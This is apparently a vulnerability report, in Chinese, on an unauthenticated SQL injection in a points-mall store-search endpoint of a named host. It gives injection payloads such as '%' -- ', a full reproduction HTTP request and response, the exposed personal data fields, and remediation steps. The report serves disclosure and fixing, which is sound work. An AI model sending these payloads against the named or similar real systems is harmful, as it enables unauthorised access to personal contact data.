# 积分商城系统存在SQL注入漏洞

**漏洞名称：** 积分商城系统存在SQL注入漏洞

**漏洞等级：** 高危

**漏洞类型：** SQL注入

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18234/emallapp/myOrder/qurallStore`

## 详细描述

新版商城“网点自提”的门店搜索接口，`searchName` 参数被服务端直接拼接到 MyBatis 的 `LIKE` 查询中，没有使用参数绑定。

该接口不需要登录，也不要求携带 Cookie。`goodsId` 是必需参数，缺少 `goodsId` 时接口没有数据；以下请求固定使用同一个 `goodsId`，只改变 `searchName`。

实测同一接口：

- `searchName=%'` 返回 `size=0`；
- `searchName=%' -- ` 返回 `size=148`，即全量网点数据；
- `searchName=天齐%' -- ` 返回 `size=1`。

同一个搜索接口在不同输入下返回 0 行或 148 行，说明用户输入已经参与 SQL 语法构造，属于 SQL 注入，不是普通模糊搜索。

## 复现步骤

前置条件：不需要账号，不需要 Cookie。

### 第 1 步：确认基线，闭合单引号后无数据

完整请求包：

```http
POST /emallapp/myOrder/qurallStore HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Origin: https://ttt.ebanktest.com.cn:18234
Referer: https://ttt.ebanktest.com.cn:18234/html/10124/view/login/login.html
Content-Length: 75
Connection: close

bankcode=10124&channel=007&goodsId=5540062316835986161262&searchName=%25%27
```

其中 `searchName=%25%27` 解码后是 `%'`。

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 58

{"size":0,"retshow":"操作成功","storlist":[],"retcode":"0000"}
```

## 影响范围

该接口无需登录即可访问，匿名用户可以读取全量网点数据。返回内容包含网点名称、联系人、手机号和地址等信息。

当前已确认可以读取网点表；是否能够进一步读取其他业务表，尚未验证。

## 修复方案

1. 将 `searchName` 改为 MyBatis 参数绑定（`#{}` 或 `CONCAT` 参数化），禁止使用 `${}` 直接拼接 SQL。
2. 对搜索参数增加长度、字符和白名单校验。
3. 该接口增加登录鉴权，禁止匿名访问；WAF 只能作为辅助防护，不能替代代码修复。
